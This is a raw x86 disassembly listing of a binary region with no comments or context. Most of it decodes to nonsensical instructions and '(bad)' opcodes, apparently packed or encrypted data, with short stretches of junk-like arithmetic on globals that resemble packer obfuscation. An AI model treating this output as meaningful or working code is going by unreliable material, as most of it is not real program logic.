  417dc2:	mov    bh,0xdc
  417dc4:	jb     0x417e2e
  417dc6:	cmp    esi,eax
  417dc8:	fadd   DWORD PTR [eax+ebp*4+0x54cf1a1]
  417dcf:	jmp    0x47c2dcaf
  417dd4:	enter  0x970,0x20
  417dd8:	and    ah,BYTE PTR ss:[esi]
  417ddb:	enter  0x51c7,0x8d
  417ddf:	add    ecx,ecx
  417de1:	ret    
  417de2:	bswap  ebx
  417de4:	inc    eax
  417de5:	aas    
  417de6:	out    0x7c,al
  417de8:	bound  esp,QWORD PTR [ecx]
  417dea:	xlat   BYTE PTR ds:[ebx]
  417deb:	shl    BYTE PTR [edi],1
  417ded:	rcr    BYTE PTR [ecx-0x66],1
  417df0:	add    eax,0x74ef252c
  417df5:	sti    
  417df6:	mov    ebp,0x490ceaa
  417dfb:	ror    al,0xef
  417dfe:	ja     0x417de8
  417e00:	imul   esp,DWORD PTR ss:[ecx-0x740ea38f],0x2e6ebbc2
  417e0b:	aaa    
  417e0c:	push   ebx
  417e0d:	out    0xd0,al
  417e0f:	inc    esp
  417e10:	or     al,0x18
  417e12:	ins    BYTE PTR es:[edi],dx
  417e13:	pop    ds
  417e14:	mov    eax,ds:0xe4261979
  417e19:	mov    eax,ecx
  417e1b:	jl     0x417db8
  417e1d:	or     DWORD PTR [esi-0x9],0xffffff86
  417e21:	xchg   dl,dh
  417e23:	sub    ah,BYTE PTR [ebx]
  417e25:	daa    
  417e26:	mov    ecx,ebx
  417e28:	jl     0x417e28
  417e2a:	stc    
  417e2b:	shr    dh,1
  417e2d:	mov    ebx,0xc4b7673e
  417e32:	pusha  
  417e33:	popa   
  417e34:	pushf  
  417e35:	push   cs
  417e36:	xrelease mov BYTE PTR [esi+0x6b98be19],dl
  417e3d:	cdq    
  417e3e:	pusha  
  417e3f:	mov    ebx,0x2d0d7520
  417e44:	mov    ch,cl
  417e46:	js     0x417e2d
  417e48:	out    0xd9,eax
  417e4a:	ins    DWORD PTR es:[edi],dx
  417e4b:	int    0xbf
  417e4d:	jbe    0x417e83
  417e4f:	icebp  
  417e50:	cli    
  417e51:	out    0xcc,al
  417e53:	inc    edi
  417e54:	(bad)  
  417e55:	ds add al,0x50
  417e58:	jns    0x417ec0
  417e5a:	cwde   
  417e5b:	jns    0x417e80
  417e5d:	pop    edi
  417e5e:	push   esi
  417e5f:	hlt    
  417e60:	mov    ebp,0x72081091
  417e65:	sub    eax,DWORD PTR [edi+0x6d]
  417e68:	(bad)  
  417e69:	jae    0x417eb3
  417e6b:	adc    al,BYTE PTR [edx]
  417e6d:	loop   0x417e2c
  417e6f:	(bad)  
  417e70:	adc    ebp,DWORD PTR [edi-0x66]
  417e73:	mov    eax,DWORD PTR [edx]
  417e75:	mov    bl,0xb4
  417e77:	je     0x417ed7
  417e79:	out    0x48,al
  417e7b:	gs call 0xd99f:0x379459ff
  417e83:	jae    0x417eaf
  417e85:	es cmp al,0x93
  417e88:	in     eax,0xd8
  417e8a:	sub    DWORD PTR [eax-0x116abbc0],ecx
  417e90:	or     BYTE PTR [edi+0xde0f251],ah
  417e96:	adc    al,0x4b
  417e98:	jp     0x417ed3
  417e9a:	(bad)  
  417e9b:	sbb    al,0xcd
  417e9d:	loop   0x417e3b
  417e9f:	push   cs
  417ea0:	mov    cl,0xb7
  417ea2:	fs retf 
  417ea4:	ds adc eax,0x7234d5ad
  417eaa:	jmp    DWORD PTR [esi+ebp*2+0x16]
  417eae:	mov    cl,0xf1
  417eb0:	into   
  417eb1:	mov    esi,0x3c2444c7
  417eb6:	aad    0x63
  417eb8:	add    BYTE PTR [eax],al
  417eba:	mov    DWORD PTR ds:0x42837f,0x432b
  417ec4:	mov    DWORD PTR [esp+0x30],0x169
  417ecc:	mov    DWORD PTR [esp+0x28],0x101b
  417ed4:	mov    DWORD PTR [esp+0x10],0x6bec
  417edc:	mov    eax,DWORD PTR [esp+0x10]
  417ee0:	mov    ecx,DWORD PTR [esp+0x28]
  417ee4:	sub    DWORD PTR ds:0x428243,0x42829b
  417eee:	imul   eax,ecx
  417ef1:	or     eax,0x7f7d
  417ef6:	xor    eax,0xcf336131
  417efb:	cmp    DWORD PTR ds:0x428393,0x0
  417f02:	mov    ecx,0x3c6
  417f07:	mov    ecx,0x355d
  417f0c:	mov    ecx,0x21c7
  417f11:	jmp    0x41834c
  417f16:	mov    DWORD PTR ds:0x42828f,0x1cb6
  417f20:	mov    DWORD PTR ds:0x42838b,0x6ca2
  417f2a:	cmp    DWORD PTR ds:0x428393,0x0
  417f31:	jge    0x417f5f
  417f37:	push   DWORD PTR [ebp-0x1c]
  417f3a:	push   DWORD PTR [ebp-0x10]
  417f3d:	call   DWORD PTR ds:0x428e98
  417f43:	sub    DWORD PTR ds:0x428267,0x19df
  417f4d:	xor    ecx,DWORD PTR ds:0x42824b
  417f53:	mov    ecx,DWORD PTR ds:0x4282ab
  417f59:	and    DWORD PTR ds:0x4281a7,ecx
  417f5f:	xor    ecx,DWORD PTR ds:0x428383
  417f65:	mov    ecx,DWORD PTR ds:0x428197
  417f6b:	or     DWORD PTR ds:0x42832b,ecx
  417f71:	mov    ecx,DWORD PTR ds:0x4283af
  417f77:	or     DWORD PTR ds:0x428297,ecx
  417f7d:	jmp    0x41834c
  417f82:	jp     0x417fbc
  417f84:	lock adc al,0x9b
  417f87:	dec    esp
  417f88:	pop    edx
  417f89:	push   ds
  417f8a:	dec    esp
  417f8b:	retf   
  417f8c:	repnz push 0x1d
  417f8f:	aam    0xe
  417f91:	jle    0x417fe6
  417f93:	fst    DWORD PTR [esi]
  417f95:	sbb    BYTE PTR [edx+edx*1-0x1490e7e8],bh
  417f9c:	clc    
  417f9d:	stc    
  417f9e:	cli    
  417f9f:	sar    ecx,cl
  417fa1:	lods   al,BYTE PTR ds:[esi]
  417fa2:	jp     0x417f88
  417fa4:	push   ds
  417fa5:	test   bh,ch
  417fa7:	fcom   DWORD PTR [edx+0x3fa41009]
  417fad:	jg     0x417fed
  417faf:	inc    ebp
  417fb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fb1:	fistp  QWORD PTR [ecx+eiz*1-0x2b]
  417fb5:	or     al,BYTE PTR [edi+0x54dcfe60]
  417fbb:	iret   
  417fbc:	xor    edx,DWORD PTR [esp+ebx*4+0x4f]
  417fc0:	bnd jb 0x417f4b
  417fc3:	sbb    eax,0xe5db5db7
  417fc8:	adc    BYTE PTR [ebp+eax*2+0x51],dl
  417fcc:	and    esi,DWORD PTR [ebp+edx*4-0x7f]
  417fd0:	ret    0xe778
  417fd3:	ja     0x418009
  417fd5:	pushf  
  417fd6:	and    ah,cl
  417fd8:	jnp    0x417f6a
  417fda:	(bad)  
  417fdb:	retf   
  417fdc:	add    dh,BYTE PTR [edx]
  417fde:	add    eax,0xa512c098
  417fe3:	jnp    0x417fa4
  417fe5:	(bad)  
  417fe6:	adc    DWORD PTR [ebx-0x5121f5e9],esi
  417fec:	adc    DWORD PTR [edx],eax
  417fee:	arpl   WORD PTR [ecx],di
  417ff0:	mov    al,0x83
  417ff2:	push   esi
  417ff3:	icebp  
  417ff4:	dec    esi
  417ff5:	retf   
  417ff6:	dec    esi
  417ff7:	fsub   st,st(1)
  417ff9:	idiv   DWORD PTR [edx-0x68]
  417ffc:	sub    dl,dl
  417ffe:	jmp    0x5b2f7e2
  418003:	ins    DWORD PTR es:[edi],dx
  418004:	in     eax,dx
  418005:	sbb    eax,0xc19fef7e
  41800a:	dec    edi
  41800b:	mov    al,0xd5
  41800d:	nop
  41800e:	mov    BYTE PTR [edi],dh
  418010:	add    al,0x95
  418012:	cmp    ebp,DWORD PTR ds:0xa0c6c390
  418018:	enter  0x3504,0xbc
  41801c:	mov    bh,0x19
  41801e:	sub    BYTE PTR [ecx+eax*1],dl
  418021:	pop    edi
  418022:	sahf   
  418023:	ja     0x417fae
  418025:	pop    ebp
  418026:	xchg   BYTE PTR [ebx+0x6a06623c],dh
  41802c:	lods   al,BYTE PTR ds:[esi]
  41802d:	mov    DWORD PTR [edi],edi
  41802f:	out    dx,al
  418030:	stos   DWORD PTR es:[edi],eax
  418031:	mov    dh,0x80
  418033:	mov    dh,0xf2
  418035:	xchg   ecx,eax
  418036:	xchg   esp,eax
  418037:	ds sar dh,0x20
  41803b:	sbb    BYTE PTR [ecx-0x4b],ch
  41803e:	xchg   DWORD PTR [eax+ecx*2+0x7d71e960],eax
  418045:	jmp    0x159d:0xa4712dd5
  41804c:	cmc    
  41804d:	mov    eax,0x7fab729e
  418052:	or     BYTE PTR [edi-0x4e7518d6],al
  418058:	jle    0x4180c9
  41805a:	loop   0x418060
  41805c:	cwde   
  41805d:	cmp    ebp,DWORD PTR [edx-0x75ea0cdb]
  418063:	push   eax
  418064:	pop    ds
  418065:	cmp    eax,0xadd699e7
  41806a:	jo     0x418042
  41806c:	leave  
  41806d:	dec    ebp
  41806e:	xor    BYTE PTR ds:0x7dfb12c5,0x9b
  418075:	add    eax,DWORD PTR [ebp+0x4c0e827d]
  41807b:	clc    
  41807c:	imul   ebp,DWORD PTR [ebp-0x5f5b1442],0xc9713941
  418086:	adc    BYTE PTR [ecx+0x7e],ch
  418089:	pop    ds
  41808a:	push   eax
  41808b:	inc    ebx
  41808c:	stc    
  41808d:	retf   0x5c84
  418090:	dec    esi
  418091:	mov    ebx,0xa6bb49e4
  418096:	fistp  DWORD PTR [edx-0x5]
  418099:	pop    edx
  41809a:	call   DWORD PTR [esi-0x5b]
  41809d:	add    ebx,DWORD PTR [edi-0x23866be2]
  4180a3:	cmp    ah,ah
  4180a5:	xchg   esp,eax
  4180a6:	adc    eax,0x3ec87cc5
  4180ab:	xchg   esp,eax
  4180ac:	icebp  
  4180ad:	fwait
  4180ae:	mov    bl,cl
  4180b0:	push   ebp
  4180b1:	scas   al,BYTE PTR es:[edi]
  4180b2:	cwde   
  4180b3:	xor    ebx,edx
  4180b5:	xchg   esi,eax
  4180b6:	inc    ebp
  4180b7:	mov    ds:0x7307216f,al
  4180bc:	repz mov bl,ah
  4180bf:	dec    esp
  4180c0:	mov    ebx,0xea74b040
  4180c5:	jmp    0xc036:0x49629bad
  4180cc:	push   eax
  4180cd:	iret   
  4180ce:	nop
  4180cf:	iret   
  4180d0:	xchg   ebx,eax
  4180d1:	pop    esi
  4180d2:	and    DWORD PTR [esi+0x39c65c89],edi
  4180d8:	vpandn ymm5,ymm0,YMMWORD PTR [edi]
  4180dc:	sub    edx,DWORD PTR [ecx]
  4180de:	(bad)  
  4180df:	arpl   WORD PTR [edi+0x5397fa5d],cx
  4180e5:	repnz or esi,DWORD PTR [edx]
  4180e8:	out    dx,eax
  4180e9:	inc    ebx
  4180ea:	div    DWORD PTR [esi-0x14]
  4180ed:	inc    edx
  4180ee:	xor    al,0x88
  4180f0:	cmp    esi,esp
  4180f2:	xor    ah,0x9a
  4180f5:	cwde   
  4180f6:	aad    0x87
  4180f8:	mov    ds:0x72240e5d,eax
  4180fd:	and    al,bl
  4180ff:	arpl   WORD PTR [esp+eax*8],dx
  418102:	popa   
  418103:	mov    ds:0xce81dad3,al
  418108:	and    BYTE PTR [ebx+0x11],bl
  41810b:	cwde   
  41810c:	inc    ebx
  41810d:	mov    ah,0x7e
  41810f:	jmp    0xdd0c:0x3c9a73a3
  418116:	inc    esi
  418117:	cwde   
  418118:	adc    eax,0x5b474d94
  41811d:	in     al,dx
  41811e:	scas   al,BYTE PTR es:[edi]
  41811f:	idiv   BYTE PTR [eax+0x6e]
  418122:	test   BYTE PTR [edx-0x34],ch
  418125:	rol    BYTE PTR [edx],1
  418127:	mov    ecx,0x449bad72
  41812c:	push   eax
  41812d:	push   ecx
  41812e:	pop    edi
  41812f:	dec    ecx
  418130:	(bad)  
  418131:	rcl    BYTE PTR [edi],1
  418133:	in     eax,0x87
  418135:	mov    ebx,0x38b880c3
  41813a:	data16 aas 
  41813c:	sbb    bh,dh
  41813e:	into   
  41813f:	xchg   esi,eax
  418140:	in     eax,dx
  418141:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418142:	(bad)  
  418143:	push   edi
  418144:	dec    esi
  418145:	adc    ecx,0xffffff98
  418148:	test   DWORD PTR [eax],edi
  41814a:	enter  0x90c6,0xfc
  41814e:	pop    edi
  41814f:	ret    
  418150:	inc    esi
  418151:	xor    ch,BYTE PTR [ecx-0x34]
  418154:	pop    eax
  418155:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418156:	outs   dx,BYTE PTR ds:[esi]
  418157:	sbb    edx,esi
  418159:	mul    BYTE PTR [edx+0x59]
  41815c:	inc    edi
  41815d:	push   cs
  41815e:	bound  edx,QWORD PTR [eax]
  418160:	add    ebx,edi
  418162:	jl     0x4181c6
  418164:	mov    al,ds:0xe4207ab6
  418169:	mov    eax,ds:0xe3d2bdbe
  41816e:	xchg   BYTE PTR [ebx+0x16],ah
  418171:	mov    dl,0xcb
  418173:	cmp    eax,0xd882427f
  418178:	sbb    BYTE PTR [ebx],0xed
  41817b:	vpcmpgtb xmm4,xmm1,XMMWORD PTR [ebx+0x7f0c9b4c]
  418183:	rcr    edx,0xb9
  418186:	xchg   edi,eax
  418187:	pushf  
  418188:	push   es
  418189:	test   BYTE PTR [esi-0x44],cl
  41818c:	fldenv [ebx-0x294deab5]
  418192:	jns    0x41819d
  418194:	dec    edi
  418195:	out    dx,al
  418196:	adc    DWORD PTR [eax+esi*1-0x28],ecx
  41819a:	test   DWORD PTR [eax+0x12],eax
  41819d:	es push 0xb77b5b9e
  4181a3:	mov    WORD PTR [ecx],ds
  4181a5:	jae    0x41814b
  4181a7:	mov    bh,0x58
  4181a9:	rcr    bl,1
  4181ab:	imul   esi,DWORD PTR [ebx+0x41],0xffffffec
  4181af:	in     al,0x8f
  4181b1:	int3   
  4181b2:	xchg   ebx,eax
  4181b3:	fisub  DWORD PTR [eax+0x1a]
  4181b6:	push   0xffffff8e
  4181b8:	in     al,0x84
  4181ba:	jp     0x4181da
  4181bc:	sub    ebx,esp
  4181be:	mov    ?,WORD PTR ds:0xeef989ec
  4181c4:	(bad)  
  4181c5:	mov    ch,0x1c
  4181c7:	jp     0x4181fb
  4181c9:	add    dh,BYTE PTR [edx-0x72]
  4181cc:	add    al,0xea
  4181ce:	lea    ecx,[esi]
  4181d0:	jp     0x418211
  4181d2:	test   DWORD PTR [esp+edi*8],esi
  4181d5:	inc    edi
  4181d6:	pop    ecx
  4181d7:	stos   DWORD PTR es:[edi],eax
  4181d8:	imul   esi,DWORD PTR [eax],0xffffffcd
  4181db:	jg     0x41816a
  4181dd:	and    bl,dl
  4181df:	out    0x83,al
  4181e1:	repz clc 
  4181e3:	inc    ebx
  4181e4:	xchg   ebx,eax
  4181e5:	rcr    BYTE PTR [esi-0x7a6dccae],0xd9
  4181ec:	or     al,0x84
  4181ee:	adc    bh,BYTE PTR [edi+eiz*1-0x460407bb]
  4181f5:	add    cl,BYTE PTR [edx+0x25]
  4181f8:	pusha  
  4181f9:	pushf  
  4181fa:	(bad)  [edx-0x36]
  4181fd:	(bad)  
  4181fe:	call   0x3998770e
  418203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418204:	jp     0x41821b
  418206:	mov    al,0xbe
  418208:	sub    BYTE PTR [ebx-0x70076c95],al
  41820e:	jns    0x41819d
  418210:	call   0x94616c4d
  418215:	push   cs
  418216:	dec    ebp
  418217:	sub    eax,0x2e6562f9
  41821c:	mov    dl,0x52
  41821e:	and    al,0xac
  418220:	loope  0x41826e
  418222:	and    edi,ebx
  418224:	ret    
  418225:	mov    ch,0x21
  418227:	es jmp 0x58727770
  41822d:	jp     0x41822a
  41822f:	hlt    
  418230:	pop    edx
  418231:	test   cl,0xe0
  418234:	mov    ch,0xe9
  418236:	mov    bh,0x57
  418238:	lahf   
  418239:	(bad)  
  41823a:	sahf   
  41823b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41823c:	shl    DWORD PTR [edx-0x36],0xae
  418240:	or     edi,DWORD PTR [eax-0x66202f62]
  418246:	sbb    dl,BYTE PTR ss:[esp+eax*2-0x14]
  41824b:	loope  0x41824f
  41824d:	inc    edi
  41824e:	int3   
  41824f:	push   edi
  418250:	shl    DWORD PTR [ebx-0x1b],cl
  418253:	jnp    0x41822e
  418255:	pop    ebp
  418256:	mov    bl,0x5e
  418258:	dec    edi
  418259:	xchg   ecx,eax
  41825a:	js     0x41821e
  41825c:	mov    ecx,0x4e09dcdf
  418261:	inc    ecx
  418262:	aad    0xf8
  418264:	pop    eax
  418265:	jne    0x4182bd
  418267:	inc    ebp
  418268:	mov    al,0xbf
  41826a:	dec    BYTE PTR ds:0x32ef3452
  418270:	sbb    bl,bl
  418272:	ds loope 0x41824c
  418275:	out    0x7e,al
  418277:	mov    esp,0x1bbc6f92
  41827c:	jne    0x41823b
  41827e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41827f:	sub    dh,BYTE PTR [eax]
  418281:	rcl    BYTE PTR [edx+0x4959b420],0x1
  418288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418289:	xchg   edi,eax
  41828a:	dec    BYTE PTR [ebp-0x1b4df9cb]
  418290:	jmp    0xe1af:0xacc88650
  418297:	jcxz   0x41828a
  41829a:	stc    
  41829b:	rcr    DWORD PTR [esi-0x6834bf5e],cl
  4182a1:	xor    DWORD PTR [ecx+0x722f734a],esi
  4182a7:	pop    edx
  4182a8:	adc    edx,DWORD PTR [esi]
  4182aa:	leave  
  4182ab:	push   ss
  4182ac:	push   0x2fac7c7
  4182b1:	test   al,0xac
  4182b3:	lea    edi,[eax]
  4182b5:	mov    es,edx
  4182b7:	aaa    
  4182b8:	mov    esi,0xd0bfe725
  4182bd:	retf   
  4182be:	scas   eax,DWORD PTR es:[edi]
  4182bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182c0:	in     eax,0x15
  4182c2:	push   esp
  4182c3:	rcr    DWORD PTR [eax-0x8],cl
  4182c6:	cld    
  4182c7:	sahf   
  4182c8:	lahf   
  4182c9:	push   edi
  4182ca:	push   eax
  4182cb:	add    al,0x15
  4182cd:	jp     0x41833f
  4182cf:	sub    DWORD PTR [edx],eax
  4182d1:	or     ecx,DWORD PTR [edi]
  4182d3:	stos   BYTE PTR es:[edi],al
  4182d4:	cmp    dh,BYTE PTR [ecx]
  4182d6:	sub    al,al
  4182d8:	imul   BYTE PTR [edx-0x4bf48ec0]
  4182de:	pop    ecx
  4182df:	ffreep st(2)
  4182e1:	jb     0x4182a9
  4182e3:	xor    DWORD PTR [esi],esi
  4182e5:	bound  edi,QWORD PTR [edi]
  4182e7:	ds or  al,0x91
  4182ea:	sti    
  4182eb:	xchg   edx,eax
  4182ec:	push   edi
  4182ed:	mov    esi,0xe131eb0b
  4182f2:	xlat   BYTE PTR ds:[ebx]
  4182f3:	test   eax,0xa23243a9
  4182f8:	call   0x96b3:0xa70b3d91
  4182ff:	pop    edi
  418300:	add    ebp,edi
  418302:	into   
  418303:	lds    ecx,FWORD PTR [esi+0x4c]
  418306:	(bad)  
  418307:	mov    cl,0x1d
  418309:	dec    edx
  41830a:	sub    ch,bh
  41830c:	xchg   ebp,eax
  41830d:	dec    esp
  41830e:	fimul  DWORD PTR [eax+0x3e]
  418311:	jo     0x4182fb
  418313:	gs out dx,eax
  418315:	test   BYTE PTR [ebp+0x3f],ch
  418318:	inc    ebx
  418319:	fdivr  st,st(7)
  41831b:	shl    BYTE PTR [edi],cl
  41831d:	sar    dh,0xba
  418320:	jnp    0x4182f6
  418322:	and    ebx,DWORD PTR [eax+0x67]
  418325:	add    eax,0x540a0ab8
  41832a:	push   ebx
  41832b:	mov    esp,DWORD PTR [ebp-0x136a06af]
  418331:	mov    ebp,0xee6e544f
  418336:	pop    esi
  418337:	outs   dx,BYTE PTR ds:[esi]
  418338:	mov    al,0x78
  41833a:	dec    edi
  41833b:	mov    cl,0xf
  41833d:	cmp    eax,0x332ee395
  418342:	xor    edx,DWORD PTR [ebx+0x1]
  418345:	test   BYTE PTR [esi+0x1670d2f8],dh
  41834b:	pop    edx
  41834c:	push   DWORD PTR [eax]
  41834e:	mov    eax,DWORD PTR [esp+0x34]
  418352:	cmp    DWORD PTR ds:0x428197,0x0
  418359:	mov    DWORD PTR ds:0x42825b,0x42c6
  418363:	mov    DWORD PTR ds:0x428397,edx
  418369:	mov    DWORD PTR ds:0x428173,0x1d0
  418373:	jmp    0x4183cc
  418378:	mov    DWORD PTR ds:0x428297,0x243f
  418382:	mov    DWORD PTR ds:0x42826f,0x6875
  41838c:	cmp    DWORD PTR ds:0x428197,0x0
  418393:	ja     0x4183ba
  418399:	push   0x36f9
  41839e:	push   0x428333
  4183a3:	push   0x488c
  4183a8:	call   DWORD PTR ds:0x428e9c
  4183ae:	add    DWORD PTR ds:0x4282ff,ecx
  4183b4:	add    ecx,DWORD PTR ds:0x428283
  4183ba:	xor    DWORD PTR ds:0x428337,edx
  4183c0:	mov    ecx,DWORD PTR ds:0x428313
  4183c6:	or     DWORD PTR ds:0x42818f,ecx
  4183cc:	add    eax,0x75d9
  4183d1:	xor    DWORD PTR ds:0x42823b,ebx
  4183d7:	push   0xd
  4183d9:	not    ecx
  4183db:	pop    ecx
  4183dc:	xor    edx,edx
  4183de:	div    ecx
  4183e0:	mov    ecx,DWORD PTR [esp+0x40]
  4183e4:	xor    edx,edx
  4183e6:	xor    DWORD PTR ds:0x42823f,0x4281ab
  4183f0:	or     eax,ecx
  4183f2:	mov    ecx,DWORD PTR [esp+0x44]
  4183f6:	xor    DWORD PTR ds:0x42819f,0x28c0
  418400:	or     eax,ecx
  418402:	movzx  ecx,WORD PTR ds:0x42839f
  418409:	or     DWORD PTR ds:0x428397,ecx
  41840f:	mov    ecx,DWORD PTR [esp+0x9c]
  418416:	sub    DWORD PTR ds:0x42816f,0x428337
  418420:	div    ecx
  418422:	xor    edx,edx
  418424:	xor    eax,0x680da048
  418429:	cmp    DWORD PTR ds:0x42823b,0x0
  418430:	mov    DWORD PTR ds:0x42824b,0x43af
  41843a:	mov    ecx,0x1f20
  41843f:	jmp    0x418491
  418444:	mov    DWORD PTR ds:0x428393,0x5a59
  41844e:	cmp    DWORD PTR ds:0x42823b,0x0
  418455:	jl     0x41847f
  41845b:	push   0x428093
  418460:	push   0x400000
  418465:	call   DWORD PTR ds:0x428df8
  41846b:	sbb    DWORD PTR ds:0x42827f,0x4c8f
  418475:	mov    DWORD PTR ds:0x428177,0x386a
  41847f:	or     ecx,DWORD PTR ds:0x428393
  418485:	xor    ecx,DWORD PTR ds:0x4282fb
  41848b:	or     ecx,0x6bea
  418491:	push   DWORD PTR [eax]
  418493:	mov    eax,DWORD PTR [esp+0x94]
  41849a:	or     DWORD PTR ds:0x428397,ecx
  4184a0:	mov    ecx,DWORD PTR [esp+0x5c]
  4184a4:	xor    DWORD PTR ds:0x42830f,0x42827b
  4184ae:	push   DWORD PTR ds:0x4facd31
  4184b4:	add    eax,0xb4a
  4184b9:	and    DWORD PTR ds:0x4283b7,0x42823f
  4184c3:	push   DWORD PTR ds:0x1e6ebff7
  4184c9:	or     DWORD PTR ds:0x42830b,0x5053
  4184d3:	imul   eax,ecx
  4184d6:	push   DWORD PTR [eax-0x3f17647c]
  4184dc:	mov    eax,DWORD PTR [esp+0x60]
  4184e0:	adc    ecx,0x139f
  4184e6:	jmp    0x4188b5
  4184eb:	and    eax,0x8fa5979d
  4184f0:	sbb    esp,DWORD PTR [ebx]
  4184f2:	sbb    eax,0x7edf00c8
  4184f7:	sbb    esi,DWORD PTR [ecx*4+0x16d1f670]
  4184fe:	sbb    BYTE PTR [edx+edx*1+0x6b771818],bh
  418505:	fild   QWORD PTR [esi]
  418507:	xchg   ecx,eax
  418508:	push   ebp
  418509:	pmaxsw mm6,mm6
  41850c:	push   ss
  41850d:	stos   DWORD PTR es:[edi],eax
  41850e:	and    DWORD PTR [edi+ecx*2],0xffffffb2
  418512:	sahf   
  418513:	pusha  
  418514:	imul   ebx,edi,0xe
  418517:	call   0x43c9:0x1553f858
  41851e:	aam    0xa7
  418520:	push   0x60de04d8
  418525:	test   al,0x78
  418527:	mov    DWORD PTR [ebx],0xd321af1a
  41852d:	jb     0x41858e
  41852f:	add    eax,0x5ba33177
  418534:	cmp    esi,DWORD PTR [edi+0x66]
  418537:	inc    esi
  418538:	(bad)  [ecx+0xa]
  41853b:	dec    esp
  41853c:	mov    edx,0x7b5f22a3
  418541:	and    eax,0x5b636771
  418546:	jg     0x418541
  418548:	pop    edi
  418549:	mov    ds:0x37bd473e,al
  41854e:	xchg   edi,eax
  41854f:	mov    dh,0x7f
  418551:	in     eax,dx
  418552:	scas   eax,DWORD PTR es:[edi]
  418553:	adc    eax,0x3083b65f
  418558:	bound  ebp,QWORD PTR [ebp-0x20]
  41855b:	push   esi
  41855c:	pop    ss
  41855d:	outs   dx,DWORD PTR ds:[esi]
  41855e:	push   ebp
  41855f:	inc    ecx
  418560:	xchg   ebx,ecx
  418562:	stos   BYTE PTR es:[edi],al
  418563:	mov    eax,gs:0x12064f5f
  418569:	je     0x4185a7
  41856b:	pop    ss
  41856c:	loop   0x4185d6
  41856e:	pop    ss
  41856f:	mov    al,ds:0x51bb6e1c
  418574:	xchg   dl,bh
  418576:	sbb    BYTE PTR [edi+0x4b9fa640],dh
  41857c:	mov    esi,0x4091a6bb
  418581:	test   al,0x11
  418583:	sbb    DWORD PTR [eax-0x8647dd2],eax
  418589:	je     0x4185a8
  41858b:	mov    ds,eax
  41858d:	pop    ebp
  41858e:	adc    BYTE PTR [edx+0x35],al
  418591:	inc    DWORD PTR [ebp+ebp*2+0x5dcba3d2]
  418598:	mov    ds:0xe8a8a4ae,eax
  41859d:	inc    edi
  41859e:	nop
  41859f:	mov    bl,0x75
  4185a1:	pop    ebx
  4185a2:	inc    edi
  4185a3:	fmul   st,st(3)
  4185a5:	(bad)  
  4185a6:	jbe    0x41861e
  4185a8:	fwait
  4185a9:	jg     0x4185f2
  4185ab:	inc    ebx
  4185ac:	ror    BYTE PTR [ebp-0x78],1
  4185af:	fwait
  4185b0:	loop   0x418631
  4185b2:	icebp  
  4185b3:	pop    ds
  4185b4:	(bad)  
  4185b5:	(bad)  
  4185b6:	adc    cl,BYTE PTR [eax-0x4d]
  4185b9:	pop    edx
  4185ba:	(bad)  
  4185bc:	aas    
  4185bd:	mov    bl,0x82
  4185bf:	retf   
  4185c0:	inc    ecx
  4185c1:	loopne 0x418611
  4185c3:	rol    DWORD PTR [eax],0x3d
  4185c6:	pop    ebp
  4185c7:	mov    BYTE PTR [ecx],bh
  4185c9:	daa    
  4185ca:	mov    ds:0x38384b21,al
  4185cf:	adc    ebx,edi
  4185d1:	aas    
  4185d2:	shl    esi,cl
  4185d4:	and    ah,BYTE PTR ds:0x4eb9eccd
  4185da:	pop    ebx
  4185db:	mov    ah,0x35
  4185dd:	mov    ds:0x53bdff22,al
  4185e2:	mov    ds:0xb5a8127d,eax
  4185e7:	(bad)  
  4185e9:	inc    esi
  4185ea:	mov    dl,0x41
  4185ec:	and    cl,BYTE PTR [esi+0x2467f5a]
  4185f2:	push   0x1e8de003
  4185f7:	fld    DWORD PTR [ebx]
  4185f9:	loope  0x4185d9
  4185fb:	and    al,0x8f
  4185fd:	adc    DWORD PTR [ebx+edx*4],ebp
  418600:	pop    ecx
  418601:	call   0x73e4eb34
  418606:	xchg   esi,eax
  418607:	neg    BYTE PTR [ebp+0x100d51c6]
  41860d:	in     al,dx
  41860e:	and    bl,BYTE PTR [esi-0x24]
  418611:	lods   al,BYTE PTR ds:[esi]
  418612:	or     dh,BYTE PTR [edi]
  418614:	idiv   ch
  418616:	xor    BYTE PTR [eax-0x1a],al
  418619:	pop    edi
  41861a:	pop    edx
  41861b:	enter  0xc4a,0xb5
  41861f:	and    al,BYTE PTR [eax+0x6ec0a7b]
  418625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418626:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418627:	jmp    0x41865a
  418629:	dec    eax
  41862a:	mov    cl,0x7e
  41862c:	mov    cl,0x5f
  41862e:	mov    eax,ds:0x3f75da69
  418633:	mov    esp,0x77fb1b4
  418638:	mov    edx,0xe5fe5a8e
  41863d:	add    cl,ch
  41863f:	iret   
  418640:	push   esp
  418641:	stos   DWORD PTR es:[edi],eax
  418642:	or     BYTE PTR [edi],dh
  418644:	and    BYTE PTR [esi-0x36],ch
  418647:	xor    al,0xcc
  418649:	int3   
  41864a:	xchg   edx,ebp
  41864c:	push   edi
  41864d:	push   ss
  41864e:	jnp    0x418695
  418650:	imul   ecx,DWORD PTR [esi-0x65],0xffffffc9
  418654:	daa    
  418655:	mov    dl,0xe8
  418657:	or     eax,0x23b3f5d8
  41865c:	mov    ch,BYTE PTR [ebx+0x1a]
  41865f:	call   0x4c2ca3bc
  418664:	call   0xc1eb029b
  418669:	cmc    
  41866a:	in     eax,dx
  41866b:	rcr    DWORD PTR [ebp-0x24],1
  41866e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41866f:	and    dh,al
  418671:	in     al,dx
  418672:	gs ins DWORD PTR es:[edi],dx
  418674:	das    
  418675:	jne    0x418652
  418677:	sub    eax,esp
  418679:	out    dx,eax
  41867a:	mov    eax,0x590542e8
  41867f:	mov    ds,WORD PTR [ebp-0x5d]
  418682:	sub    al,0xb0
  418684:	gs aas 
  418686:	in     al,0xf1
  418688:	or     eax,0xe8f07c6d
  41868d:	xor    DWORD PTR ds:0xcec555d6,esi
  418693:	fadd   QWORD PTR ds:0x57d3fe0f
  418699:	dec    esi
  41869a:	and    DWORD PTR [ebx-0x26],esp
  41869d:	inc    esi
  41869e:	in     al,dx
